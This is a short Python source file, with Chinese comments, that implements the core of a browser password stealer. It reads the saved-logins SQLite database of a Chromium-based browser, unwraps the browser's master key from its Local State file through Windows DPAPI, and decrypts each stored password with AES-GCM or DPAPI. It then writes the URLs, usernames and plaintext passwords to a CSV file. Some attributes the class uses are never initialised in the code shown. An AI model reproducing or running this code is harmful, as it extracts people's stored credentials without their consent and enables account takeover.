# -*-coding:utf-8-*- 
# 作者：   29511
# 文件名:  sdfdf.py
# 日期时间：2022/5/10，9:27
import base64
import csv
import json
import os
import sqlite3


class My:
    def __init__(self):
        pass

    '''读取数据库数据'''

    def readdb(self, dbpath, master_key):
        sql = 'SELECT origin_url, username_value, password_value, date_created, date_last_used FROM logins;'
        client = sqlite3.connect(dbpath)
        cursor = client.cursor()
        with open(self.savename, 'a', newline='', encoding='utf-8-sig') as csv_file:
            cursor.execute(sql)
            csv_writer = csv.writer(csv_file, dialect=('excel'))
            if not self.write_heads_flag:
                csv_writer.writerow(self.csv_heads)
                self.write_heads_flag = True
            info = []
            for row in cursor.fetchall():
                for idx in range(len(self.csv_heads)):
                    if isinstance(row[idx], bytes):
                        info.append(self.decrypt(row[idx], master_key))
                    else:
                        info.append(row[idx])
                csv_writer.writerow(info)
                info = []
        cursor.close()
        client.close()

    '''获得master key'''

    def getmasterkey(self, local_state_path):
        import win32crypt
        with open(os.environ['USERPROFILE'] + os.sep + local_state_path, 'r', encoding='utf-8') as fp:
            local_state = fp.read()
            local_state = json.loads(local_state)
        master_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = master_key[5:]
        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    '''解码'''

    def decrypt(self, value, master_key):
        print(value)
        if value[:3] == b'v10':
            from Crypto.Cipher import AES
            iv, payload = value[3:15], value[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_value = cipher.decrypt(payload)
            decrypted_value = decrypted_value[:-16].decode()
        else:
            import win32crypt
            decrypted_value = win32crypt.CryptUnprotectData(value)[1].decode()
        return decrypted_value
